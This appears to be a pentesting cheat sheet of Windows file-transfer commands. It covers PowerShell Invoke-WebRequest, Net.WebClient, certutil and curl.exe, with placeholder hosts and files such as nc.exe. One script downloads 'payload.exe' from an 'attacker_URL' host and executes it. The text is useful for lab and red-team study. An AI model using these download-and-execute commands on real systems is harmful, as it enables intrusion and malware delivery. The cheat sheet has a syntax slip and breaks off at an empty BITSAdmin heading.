```powershell
# Invoke-WebRequest
PS> powershell wget -Uri http://<IP>/file -OutFile C:\Windows\Temp\file # wget is an alias for Invoke-WebRequest
PS> powershell IWR -Uri http://<IP>:<PORT>/<file.exe> -OutFile <C:\temp\nc.exe>
PS> powershell (iwr http://demo.mediacore.tv/files/31266.mp4).Content >video.mp4
PS> curl ... # alias for IWR, not for curl.exe (different programs)

# Net.WebClient - noisy and not recommendad
PS> (new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<file.exe>','<C:\file.exe>')
PS> (new-object System.Net.WebClient).DownloadFileAsync('http://<IP>:<PORT>/<file.exe>','<C:\file.exe>')

# Certutilexe w/ -urlcache argument
cmd> certutil -urlcache -f http://<IP>:<PORT>/<file_name> <file_name_>

# curl.exe
cmd>/PS> curl.exe 172.16.1.30/wget.exe -o C:\temp\wget.exe
```
# Net.WebClient DownloadFile script

```powershell
PS> $downloader = New-Object System.Net.WebClient
PS> $payload = "http://attacker_URL/payload.exe"
PS> $local_file = "C:\programdata\payload.exe"
PS> $downloader.DownloadFile $payload,$local_file)
PS> & $local_file # execute file
```

# BITSAdmin.exe
